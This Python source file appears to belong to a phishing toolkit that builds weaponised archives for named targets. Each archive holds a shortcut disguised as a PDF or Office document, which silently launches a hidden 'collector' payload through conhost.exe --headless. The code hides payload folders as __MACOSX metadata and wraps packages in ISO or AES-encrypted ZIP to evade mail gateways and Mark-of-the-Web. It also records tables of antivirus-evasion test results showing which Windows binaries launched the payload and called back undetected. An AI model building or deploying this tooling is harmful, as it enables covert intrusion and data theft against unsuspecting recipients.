import os
import json
import ntpath
import shutil
import tempfile
import threading
import zipfile
from datetime import datetime

import pycdlib
import pylnk3
import pyzipper

from .exe_builder import BASE_DIR, BUILD_DIR, OUTPUT_DIR, build_exe
from .config_manager import load_config, resolve_exe_name

LNK_REGISTRY_PATH = os.path.join(BASE_DIR, 'data', 'lnk_registry.json')

# Disguised extension used for both the LNK name and its icon
LURE_EXT_CHOICES = ('pdf', 'docx', 'xlsx', 'zip')
DEFAULT_LURE_EXT = 'pdf'

# Delivery container: plain ZIP, ISO image, or password-protected ZIP wrapping the ISO
CONTAINER_CHOICES = (
    ('zip', 'ZIP 压缩包', '直接投递 ZIP，兼容性最好。'),
    ('iso', 'ISO 镜像', '以光盘镜像投递，绕过部分邮件网关对压缩包的检查（Windows 可直接装载）。'),
    ('iso_zip', 'ISO + 密码 ZIP', 'ISO 再套一层 AES 加密 ZIP，避免网关扫描与 MOTW 传播，密码需另行告知目标。'),
)
CONTAINER_KEYS = tuple(key for key, _, _ in CONTAINER_CHOICES)
DEFAULT_CONTAINER = 'zip'

# System icons available on stock Windows; used because a custom .ico cannot
# be referenced reliably from an extracted archive.
LNK_ICON_MAP = {
    'pdf': ('%SystemRoot%\\System32\\SHELL32.dll', 70),
    'docx': ('%SystemRoot%\\System32\\SHELL32.dll', 70),
    'xlsx': ('%SystemRoot%\\System32\\SHELL32.dll', 70),
    'zip': ('%SystemRoot%\\System32\\SHELL32.dll', 31),
}

CONHOST_PATH = r'C:\Windows\System32\conhost.exe'

# conhost.exe --headless passed Windows 10 + 360 + Defender testing and is the
# only launch chain kept in the product, so it is always enabled.
DEFAULT_EVASION = 'conhost'

EVASION_OPTIONS = (
    ('conhost', 'conhost 无窗口执行',
     'LNK 调用 conhost.exe --headless 读取命令文件，不弹出控制台窗口（Windows 10 1809+）。'),
    ('macosx', '伪装 __MACOSX 目录',
     '把载荷目录嵌套为 __MACOSX 层级并隐藏，模拟压缩包元数据目录。'),
)
EVASION_CHOICES = tuple(key for key, _, _ in EVASION_OPTIONS)

# Live results from Windows 10 + 360 Total Security + Defender (2026-10-26,
# all rows retested on the current conhost launcher).
EVASION_RESULTS = {
    'conhost': (True, '默认启动链，ZIP/ISO 实测无拦截，载荷成功回连'),
    'macosx': (True, '__MACOSX 伪装 + conhost 链，实测无拦截，载荷回连成功'),
    'vbs': (False, '360 拦截 run.bat 调用 Explorer 启动载荷，未回连'),
    'obfuscate': (False, '360 拦截 Explorer 启动载荷，未回连'),
    'decoy': (False, '360 拦截 Explorer 启动载荷，未回连'),
    'pad': (False, 'LNK 被 Defender 判为 Exploit:Win32/Kloshag.D!dha 并删除'),
}

# Failed methods stay documented (and non-selectable) so they are not retested.
EVASION_REJECTED = (
    ('vbs', 'Explorer → VBS → BAT 隐藏链',
     'LNK 启动 VBS，再由 VBS 隐藏运行 BAT 拉起载荷。'),
    ('obfuscate', '字符串拆分 + 干扰码',
     'BAT 中拆分拼接载荷名并插入延时干扰命令。'),
    ('decoy', '打开诱饵文档',
     '载荷启动后自动打开隐藏的同后缀诱饵文档。'),
    ('pad', '参数空白填充',
     '在 LNK 参数前填充大量空格，隐藏真实参数。'),
)

# Host binaries tested as LNK launchers on the same 360 + Defender VM
# (2026-10-26). Prerequisite copies noted where the binary loads files from
# its working directory.
LAUNCHER_RESULTS = (
    ('conhost.exe --headless', True, '默认链，无拦截，载荷成功回连'),
    ('cmd.exe /c start', True, '无拦截，载荷成功回连'),
    ('mshta.exe', True, '无拦截，载荷成功回连（含内联 VBScript）'),
    ('forfiles.exe /p /m /c', True, '无拦截，载荷成功回连'),
    ('CustomShellHost.exe', True, '工作目录放置 explorer.exe 载荷副本，回连成功'),
    ('WorkFolders.exe', True, '工作目录放置 control.exe 载荷副本，回连成功'),
    ('stordiag.exe', True, '同目录放置 schtasks.exe / systeminfo.exe 载荷副本，回连成功'),
    ('wscript.exe（VBS）', False, '360 静默拦截并删除载荷'),
    ('pcalua.exe', False, 'SmartScreen 阻止启动（MOTW）'),
    ('rundll32.exe', False, '360 静默拦截并删除载荷'),
    ('wmic.exe', False, '360 静默拦截并删除载荷'),
    ('MSBuild.exe', False, '360 拦截并删除载荷'),
    ('pcwrun.exe', False, '360 拦截 msdt DCOM 调用（进程防护）'),
    ('InfDefaultInstall.exe', False, '宿主未启动，运行挂起超时，未回连'),
    ('cmstp.exe', False, '未见宿主进程，未回连'),
    ('OpenWith.exe', False, '宿主启动但载荷未执行（SmartScreen / 需交互）'),
    ('TTTracer.exe', False, '未见宿主进程，未回连'),
    ('SyncAppvPublishingServer.exe', False, '宿主未启动，未回连'),
    ('wlrmdr.exe', False, '通知需交互，锁定桌面下未执行，未回连'),
    ('AppVLP.exe', None, '本机不存在（Win10 未内置）'),
    ('ScriptRunner.exe / RunScriptHelper.exe', None, '本机不存在'),
)

_lock = threading.Lock()


def _load_registry():
    os.makedirs(os.path.dirname(LNK_REGISTRY_PATH), exist_ok=True)
    if not os.path.exists(LNK_REGISTRY_PATH):
        return {}
    with open(LNK_REGISTRY_PATH, 'r', encoding='utf-8') as f:
        return json.load(f)


def _save_registry(reg):
    os.makedirs(os.path.dirname(LNK_REGISTRY_PATH), exist_ok=True)
    with open(LNK_REGISTRY_PATH, 'w', encoding='utf-8') as f:
        json.dump(reg, f, ensure_ascii=False, indent=2)


def register_lnk(token, filename):
    with _lock:
        reg = _load_registry()
        reg[token] = filename
        _save_registry(reg)


def unregister_lnk(token):
    with _lock:
        reg = _load_registry()
        reg.pop(token, None)
        _save_registry(reg)


def is_lnk_registered(token):
    with _lock:
        return token in _load_registry()


def get_lnk_filename(token):
    with _lock:
        return _load_registry().get(token)


def get_lnk_path(token):
    filename = get_lnk_filename(token)
    if not filename:
        return None
    return os.path.join(OUTPUT_DIR, filename)


def clear_lnk_registry():
    with _lock:
        _save_registry({})


def _safe_name(name):
    for ch in '<>:"/\\|?*':
        name = name.replace(ch, '_')
    name = ''.join(c for c in name if ord(c) >= 32)
    return name.strip(' .') or 'target'


def lnk_artifact_name(target_name, token, exe_filename='', container=None):
    if container is None:
        container = _container(load_config())
    base = _safe_name(resolve_exe_name(target_name, token, exe_filename))
    return base + ('.iso' if container == 'iso' else '.zip')


def _container(config):
    container = str(config.get('lnk_container', DEFAULT_CONTAINER)).lower()
    return container if container in CONTAINER_KEYS else DEFAULT_CONTAINER


def _zip_password(config):
    return str(config.get('lnk_zip_password', '') or '').strip()[:128]


def _lure_ext(config):
    ext = str(config.get('lnk_lure_ext', DEFAULT_LURE_EXT)).lower()
    return ext if ext in LURE_EXT_CHOICES else DEFAULT_LURE_EXT


def _evasion(config):
    selected = config.get('lnk_evasion') or []
    if not isinstance(selected, list):
        selected = []
    evasion = {e for e in selected if e in EVASION_CHOICES}
    evasion.add(DEFAULT_EVASION)
    return evasion


def _lnk_display_name(base, ext):
    if base.lower().endswith('.' + ext):
        return base + '.lnk'
    return f'{base}.{ext}.lnk'


def _lnk_segment(name, folder):
    segment = pylnk3.PathSegmentEntry()
    segment.type = pylnk3.TYPE_FOLDER if folder else pylnk3.TYPE_FILE
    segment.file_size = 0
    segment.short_name = name
    segment.full_name = name
    stamp = datetime(2020, 1, 1)
    segment.created = segment.modified = segment.accessed = stamp
    return segment


def _write_lnk(lnk_path, target, arguments, ext):
    """Write a LNK with an absolute shell item list that is valid on any host.

    pylnk3.for_file() classifies path components with os.path.isdir(), so a
    link built on Linux marks every directory as a FILE segment and leaves
    LinkInfo empty; Explorer then cannot resolve the target at all. Build the
    segments by name instead and add LinkInfo as a second resolution path.
    """
    icon_file, icon_index = LNK_ICON_MAP.get(ext, LNK_ICON_MAP[DEFAULT_LURE_EXT])
    drive, rest = ntpath.splitdrive(target)
    names = [part for part in rest.split('\\') if part]
    if not drive or not names:
        raise ValueError(f'LNK target must be an absolute path: {target!r}')

    lnk = pylnk3.create(lnk_path)
    lnk.link_flags.IsUnicode = True
    items = [pylnk3.RootEntry(pylnk3.ROOT_MY_COMPUTER),
             pylnk3.DriveEntry(drive + '\\')]
    for name in names[:-1]:
        items.append(_lnk_segment(name, True))
    items.append(_lnk_segment(names[-1], False))
    lnk.shell_item_id_list = pylnk3.LinkTargetIDList()
    lnk.shell_item_id_list.items = items

    info = lnk._link_info
    info.local = 1
    info.remote = 0
    info.drive_type = pylnk3.DRIVE_FIXED
    info.drive_serial = 0x1A2B3C4D
    info.volume_label = ''
    info.local_base_path = target
    info.make_path()
    lnk.link_flags.HasLinkInfo = True
    lnk.link_flags.ForceNoLinkInfo = False

    lnk.link_flags.HasArguments = True
    lnk.arguments = arguments
    lnk.link_flags.HasIconLocation = True
    lnk.icon = icon_file
    lnk.icon_index = icon_index
    lnk.window_mode = pylnk3.WINDOW_MINIMIZED
    lnk.save()


def _add_hidden_file(zf, arcname, source_path):
    info = zipfile.ZipInfo(arcname)
    info.create_system = 0  # FAT: external_attr holds DOS attributes
    info.external_attr = 0x22  # hidden | archive
    info.compress_type = zipfile.ZIP_DEFLATED
    with open(source_path, 'rb') as f:
        zf.writestr(info, f.read())


def _add_hidden_dir(zf, arcname):
    info = zipfile.ZipInfo(arcname.rstrip('/') + '/')
    info.create_system = 0
    info.external_attr = 0x16  # directory | hidden | system
    info.compress_type = zipfile.ZIP_STORED
    zf.writestr(info, b'')


def _write_zip_package(staging_dir, lnk_path, lnk_name, folder, hidden_files,
                       zip_path):
    arc_folder = folder.replace('\\', '/')
    parts = arc_folder.split('/')
    tmp_zip = zip_path + '.part'
    with zipfile.ZipFile(tmp_zip, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.write(lnk_path, lnk_name)
        for i in range(1, len(parts) + 1):
            _add_hidden_dir(zf, '/'.join(parts[:i]))
        for name in hidden_files:
            _add_hidden_file(zf, f'{arc_folder}/{name}',
                             os.path.join(staging_dir, *parts, name))
    os.replace(tmp_zip, zip_path)


def _iso_dir_names(parts):
    """ISO9660 directory names (8 chars max); UDF/Joliet keep display names."""
    names = []
    for idx, part in enumerate(parts):
        if part.upper() == '__MACOSX':
            names.append('__MACOSX')
        else:
            names.append(f'CACHE_{idx}')
    return names


def _joliet_component(name):
    """pycdlib caps Joliet components at 64 UTF-8 bytes; truncate long names."""
    if len(name.encode('utf-8')) <= 64:
        return name
    stem, dot, ext = name.rpartition('.')
    suffix = ('.' + ext) if dot else ''
    budget = 64 - len(suffix.encode('utf-8'))
    kept = ''
    for ch in stem:
        if len((kept + ch).encode('utf-8')) > budget:
            break
        kept += ch
    return (kept or 'document') + suffix


def _write_iso_package(staging_dir, lnk_path, lnk_name, folder, hidden_files,
                       iso_path):
    """Write the launcher and payload folder as an ISO9660/Joliet/UDF image.

    UDF carries the full Unicode lure name (Joliet truncates it); Windows 10+
    mounts the UDF volume. ISO has no DOS hidden attribute, so the payload
    folder stays visible; use the ``macosx`` evasion option to disguise it.
    """
    parts = folder.split('\\')
    iso_dirs = _iso_dir_names(parts)
    folder_dir = os.path.join(staging_dir, *parts)
    iso_folder = '/' + '/'.join(iso_dirs)
    udf_folder = '/' + '/'.join(parts)
    tmp_iso = iso_path + '.part'

    iso = pycdlib.PyCdlib()
    try:
        iso.new(joliet=3, udf='2.60')
        current = ''
        for i, name in enumerate(iso_dirs):
            current += '/' + name
            iso.add_directory(
                iso_path=current,
                joliet_path='/' + '/'.join(parts[:i + 1]),
                udf_path='/' + '/'.join(parts[:i + 1]),
            )
        iso.add_file(
            lnk_path, iso_path='/DOCUMENT.LNK;1',
            joliet_path='/' + _joliet_component(lnk_name),
            udf_path='/' + lnk_name,
        )
        for name in hidden_files:
            iso.add_file(
                os.path.join(folder_dir, name),
                iso_path=f'{iso_folder}/{name.upper()};1',
                joliet_path=udf_folder + '/' + _joliet_component(name),
                udf_path=udf_folder + '/' + name,
            )
        iso.write(tmp_iso)
    finally:
        iso.close()
    os.replace(tmp_iso, iso_path)


def _write_iso_zip(iso_path, zip_path, password):
    tmp_zip = zip_path + '.part'
    entry = os.path.basename(iso_path)
    if password:
        with pyzipper.AESZipFile(
            tmp_zip, 'w', compression=pyzipper.ZIP_DEFLATED,
            encryption=pyzipper.WZ_AES,
        ) as zf:
            zf.setpassword(password.encode('utf-8'))
            zf.write(iso_path, entry)
    else:
        with zipfile.ZipFile(tmp_zip, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.write(iso_path, entry)
    os.replace(tmp_zip, zip_path)


def _write_command_file(script_path, commands):
    # conhost.exe --headless feeds this file straight to cmd's stdin.
    with open(script_path, 'w', encoding='ascii', newline='\r\n') as f:
        for command in commands:
            f.write(command + '\n')
        f.write('exit\n')


def _payload_folder(token, evasion):
    if 'macosx' in evasion:
        return '\\'.join(['__MACOSX'] * 3)
    return 'cache_' + token[:8]


def build_lnk_package(server_url, token, target_name, exe_filename=''):
    """Build a target EXE and wrap it in a ZIP/ISO with a disguised LNK launcher.

    Package layout:
        <doc-name>.pdf.lnk          visible shortcut
        <hidden folder>/viewer.exe  collector payload
        <hidden folder>/data.dat    command file that launches the payload
    The LNK always launches conhost.exe --headless, the only chain that passed
    360 + Defender testing. An optional __MACOSX layer disguises the payload
    folder; the container can be ZIP, ISO, or an AES-encrypted ZIP wrapping
    the ISO.
    """
    config = load_config()
    ext = _lure_ext(config)
    evasion = _evasion(config)
    container = _container(config)

    exe_path = build_exe(server_url, token, target_name, exe_filename)
    base = _safe_name(resolve_exe_name(target_name, token, exe_filename))
    artifact_name = lnk_artifact_name(target_name, token, exe_filename, container)
    artifact_path = os.path.join(OUTPUT_DIR, artifact_name)
    lnk_name = _lnk_display_name(base, ext)

    # Container changes leave the old artifact behind under a different extension
    old_name = get_lnk_filename(token)
    if old_name and old_name != artifact_name:
        try:
            os.remove(os.path.join(OUTPUT_DIR, old_name))
        except OSError:
            pass

    os.makedirs(BUILD_DIR, exist_ok=True)
    staging = tempfile.mkdtemp(prefix=f'lnk_{token[:8]}_', dir=BUILD_DIR)
    payload_name = 'viewer.exe'
    script_name = 'data.dat'
    folder = _payload_folder(token, evasion)
    folder_dir = os.path.join(staging, *folder.split('\\'))

    try:
        os.makedirs(folder_dir)
        shutil.copy2(exe_path, os.path.join(folder_dir, payload_name))

        launch = f'{folder}\\{payload_name}'
        _write_command_file(os.path.join(folder_dir, script_name), [launch])

        target = CONHOST_PATH
        arguments = f'--headless cmd /c "cmd < {folder}\\{script_name}"'
        lnk_path = os.path.join(staging, lnk_name)
        _write_lnk(lnk_path, target, arguments, ext)

        hidden_files = [payload_name, script_name]

        os.makedirs(OUTPUT_DIR, exist_ok=True)
        if container == 'zip':
            _write_zip_package(staging, lnk_path, lnk_name, folder,
                               hidden_files, artifact_path)
        else:
            iso_path = os.path.join(OUTPUT_DIR, base + '.iso')
            _write_iso_package(staging, lnk_path, lnk_name, folder,
                               hidden_files, iso_path)
            if container == 'iso':
                artifact_name = os.path.basename(iso_path)
                artifact_path = iso_path
            else:
                _write_iso_zip(iso_path, artifact_path, _zip_password(config))
                try:
                    os.remove(iso_path)
                except OSError:
                    pass

        register_lnk(token, artifact_name)
        return artifact_path
    finally:
        shutil.rmtree(staging, ignore_errors=True)


def build_lnk_packages_batch(server_url, targets):
    results = []
    for t in targets:
        try:
            artifact_path = build_lnk_package(
                server_url, t['token'], t['name'], t.get('exe_filename', ''))
            results.append({
                'target_id': t['id'],
                'name': t['name'],
                'success': True,
                'package_path': artifact_path,
                'package_name': os.path.basename(artifact_path),
            })
        except Exception as e:
            results.append({
                'target_id': t['id'],
                'name': t['name'],
                'success': False,
                'error': str(e),
            })
    return results
